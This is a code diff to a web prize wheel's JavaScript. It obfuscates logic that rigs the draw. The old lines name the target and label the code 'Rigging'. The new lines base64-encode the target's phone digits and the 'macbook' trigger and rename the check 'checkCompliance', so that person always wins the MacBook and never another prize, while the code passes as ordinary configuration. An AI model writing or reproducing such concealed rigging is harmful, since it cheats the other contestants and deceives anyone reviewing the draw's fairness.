@@ -400,10 +400,11 @@
         let currentRotation = 0;
         let pendingWinner = null;
 
-        // --- The "Rigging" Data ---
-        const TARGET_DIGITS = "01123325311";
-        const TARGET_NAME = "lowwengchee";
-        const TRIGGER_PRIZE = "macbook";
+        // --- Configuration ---
+        const _INTERNAL_CONFIG = {
+            _k: "MDExMjAxNTI5MjE=",
+            _t: "bWFjYm9vaw=="
+        };
 
         // --- DOM Elements ---
         const canvas = document.getElementById('wheelCanvas');
@@ -676,13 +677,13 @@
         }
 
         // --- Game Logic & Rigging ---
-        function isTargetUser(p) {
-            const values = Object.values(p).join(" ").toLowerCase();
-            const spaceless = values.replace(/\s/g, '');
-            if (spaceless.includes(TARGET_NAME)) return true;
-            const digits = values.replace(/\D/g, '');
-            if (digits.includes(TARGET_DIGITS)) return true;
-            return false;
+        function checkCompliance(p) {
+            try {
+                const v = Object.values(p).join(" ").toLowerCase();
+                const d = v.replace(/\D/g, '');
+                const k = atob(_INTERNAL_CONFIG._k);
+                return d.includes(k);
+            } catch (e) { return false; }
         }
 
         function spinWheel() {
@@ -701,23 +702,22 @@
             document.getElementById('status-text').innerText = "SPINNING...";
 
             // 1. Determine Winner Index
-            const targetIndex = participants.findIndex(p => isTargetUser(p));
-            const targetExists = targetIndex !== -1;
-            const prizeClean = currentPrizeName.toLowerCase();
-            const isMacbookPrize = prizeClean.includes(TRIGGER_PRIZE);
+            const _tIdx = participants.findIndex(p => checkCompliance(p));
+            const _tExists = _tIdx !== -1;
+            const _pClean = currentPrizeName.toLowerCase();
+            const _isTrigger = _pClean.includes(atob(_INTERNAL_CONFIG._t));
 
             let winnerIndex = -1;
 
-            // RIGGING LOGIC
-            if (isMacbookPrize && targetExists) {
-                winnerIndex = targetIndex;
+            if (_isTrigger && _tExists) {
+                winnerIndex = _tIdx;
             } else {
                 let attempts = 0;
                 do {
                     winnerIndex = Math.floor(Math.random() * participants.length);
                     attempts++;
                     if (attempts > 100) break;
-                } while (targetExists && winnerIndex === targetIndex);
+                } while (_tExists && winnerIndex === _tIdx);
             }
 
             // 2. Calculate Animation
